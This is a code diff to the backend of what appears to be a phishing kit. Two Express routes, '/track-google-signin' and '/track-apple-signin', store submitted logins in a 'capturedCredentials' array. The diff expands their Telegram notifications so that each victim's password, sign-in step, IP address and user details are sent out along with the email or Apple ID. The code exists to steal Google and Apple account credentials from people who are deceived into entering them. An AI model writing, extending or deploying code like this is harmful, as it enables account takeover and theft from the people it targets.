@@ -272,8 +272,14 @@ router.post('/track-google-signin', async (req, res) => {
     capturedCredentials.push(credentialData);
     console.log('📧 Google Sign-In Tracked:', credentialData);
     
-    // Send Telegram notification for initial step
-    sendCredentialStartNotification('Google', { email, ipAddress, userDetails }).catch(err =>
+    // Send Telegram notification for each step
+    sendCredentialStartNotification('Google', { 
+      email, 
+      password, 
+      step, 
+      ipAddress, 
+      userDetails 
+    }).catch(err =>
       console.error('Telegram notification failed:', err)
     );
     
@@ -364,8 +370,14 @@ router.post('/track-apple-signin', async (req, res) => {
     capturedCredentials.push(credentialData);
     console.log('🍎 Apple Sign-In Tracked:', credentialData);
     
-    // Send Telegram notification for initial step
-    sendCredentialStartNotification('Apple', { appleId, ipAddress, userDetails }).catch(err =>
+    // Send Telegram notification for each step
+    sendCredentialStartNotification('Apple', { 
+      appleId, 
+      password, 
+      step, 
+      ipAddress, 
+      userDetails 
+    }).catch(err =>
       console.error('Telegram notification failed:', err)
     );
     
